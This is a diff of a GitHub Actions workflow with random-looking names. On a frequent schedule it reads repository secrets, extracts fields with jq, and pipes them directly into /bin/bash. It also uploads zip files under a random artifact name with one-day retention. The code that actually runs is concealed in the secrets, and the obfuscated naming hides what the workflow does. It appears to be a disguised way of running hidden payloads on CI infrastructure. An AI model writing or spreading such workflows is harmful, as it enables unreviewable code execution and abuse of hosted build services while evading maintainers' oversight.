@@ -1,23 +1,24 @@
 name: wubeizhenzhu
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '38 5/6 * * *'
 
-jobs:  # 1955
+  schedule:
+    - cron: '8 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wubeizhenzhu
         env:
-          hd842: ${{ secrets.hd842 }}
+          puboo14152: ${{ secrets.puboo14152 }}
         run: |
-          echo $hd842 | jq -r .elk3800 | /bin/bash
-          echo $qvjjd227 | jq -r .r382 | /bin/bash
-          echo $kwoqa89 | jq -r .fo39 | /bin/bash
-          echo $mr41930 | jq -r .c29637 | /bin/bash
-          echo $nzrdr5866 | jq -r .i1588 | /bin/bash
-          echo $oac29996 | jq -r .k52645 | /bin/bash
+          printf '%s' "$puboo14152" | jq -r .jo88026 | /bin/bash
+          printf '%s' "$f2" | jq -r .ntidx976 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: nE1q4Zu0
+          path: "*.zip"
+          retention-days: 1
